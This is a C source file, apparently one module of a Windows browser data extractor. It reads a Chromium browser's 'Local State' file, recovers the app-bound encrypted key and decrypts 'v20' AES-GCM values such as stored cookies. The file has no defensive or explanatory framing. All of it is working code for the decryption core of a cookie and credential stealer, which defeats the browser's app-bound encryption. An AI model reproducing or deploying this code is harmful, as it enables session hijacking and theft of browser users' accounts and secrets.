#include <Windows.h>
#include <ShlObj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include "Decrypt.h"
#include "Extractor.h"
#include "Elevator.h"
#include "Memory\Memory.h"
#include "Libs\cJSON.h"

BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* encrypted, DWORD encryptedLen, BYTE** plaintext, DWORD* plaintextLen, BOOL skipCookieHeader)
 {
    BCRYPT_ALG_HANDLE hAlg = 0;
    BCRYPT_KEY_HANDLE hKey = 0;
    NTSTATUS status;
    BOOL success = FALSE;
    BYTE* iv = 0;
    BYTE* tag = 0;
    BYTE* ciphertext = 0;
    DWORD ciphertextLen = 0;
    DWORD headerSize = 0;

    if (encryptedLen < 3 + 12 + 16 || MemCmp(encrypted, "v20", 3) != 0) {
        return FALSE;
    }

    iv = (BYTE*)(encrypted + 3);
    tag = (BYTE*)(encrypted + encryptedLen - 16);
    ciphertextLen = encryptedLen - 3 - 12 - 16;
    ciphertext = (BYTE*)(encrypted + 3 + 12);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, 0, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, 0, 0, (PBYTE)key, keyLen, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    BYTE* fullPlaintext = (BYTE*)Alloc(ciphertextLen);
    if (!fullPlaintext) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;

    DWORD decryptedLen = ciphertextLen;
    status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, &authInfo, 0, 0, fullPlaintext, ciphertextLen, &decryptedLen, 0);
    if (!NT_SUCCESS(status)) {
        Free(fullPlaintext);
        goto cleanup;
    }

    headerSize = (skipCookieHeader && decryptedLen > 32) ? 32 : 0;
    *plaintextLen = decryptedLen - headerSize;
    *plaintext = (BYTE*)Alloc(*plaintextLen);
    if (!*plaintext) {
        Free(fullPlaintext);
        goto cleanup;
    }
    MemCopy(*plaintext, fullPlaintext + headerSize, *plaintextLen);
    Free(fullPlaintext);

    success = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return success;
}

BOOL GetEncryptedKey(BYTE** key, DWORD* keyLen) {
    char localAppData[MAX_PATH];
    char localStatePath[MAX_PATH];
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD fileSize = 0;
    char* jsonContent = 0;
    DWORD bytesRead = 0;
    cJSON* root = 0;
    cJSON* osCrypt = 0;
    cJSON* encKey = 0;
    BYTE* decoded = 0;
    DWORD decodedLen = 0;

    GetAppDataPath(localAppData, MAX_PATH);
    snprintf(localStatePath, MAX_PATH, "%s\\%s\\Local State", localAppData, g_browser.userDataSubPath);

    hFile = CreateFileA(localStatePath, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    fileSize = GetFileSize(hFile, 0);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    jsonContent = (char*)Alloc(fileSize + 1);
    if (!jsonContent) {
        CloseHandle(hFile);
        return FALSE;
    }

    if (!ReadFile(hFile, jsonContent, fileSize, &bytesRead, 0) || bytesRead != fileSize) {
        Free(jsonContent);
        CloseHandle(hFile);
        return FALSE;
    }
    jsonContent[fileSize] = '\0';
    CloseHandle(hFile);

    root = cJSON_Parse(jsonContent);
    if (!root) {
        Free(jsonContent);
        return FALSE;
    }

    osCrypt = cJSON_GetObjectItem(root, "os_crypt");
    if (!osCrypt) {
        cJSON_Delete(root);
        Free(jsonContent);
        return FALSE;
    }

    encKey = cJSON_GetObjectItem(osCrypt, "app_bound_encrypted_key");
    if (!encKey || !cJSON_IsString(encKey)) {
        cJSON_Delete(root);
        Free(jsonContent);
        return FALSE;
    }

    CryptStringToBinaryA(encKey->valuestring, 0, CRYPT_STRING_BASE64, 0, &decodedLen, 0, 0);
    decoded = (BYTE*)Alloc(decodedLen);
    if (!decoded) {
        cJSON_Delete(root);
        Free(jsonContent);
        return FALSE;
    }
    CryptStringToBinaryA(encKey->valuestring, 0, CRYPT_STRING_BASE64, decoded, &decodedLen, 0, 0);

    *keyLen = decodedLen - 4;
    *key = (BYTE*)Alloc(*keyLen);
    if (!*key) {
        Free(decoded);
        cJSON_Delete(root);
        Free(jsonContent);
        return FALSE;
    }
    MemCopy(*key, decoded + 4, *keyLen);
    Free(decoded);

    cJSON_Delete(root);
    Free(jsonContent);
    return TRUE;
}
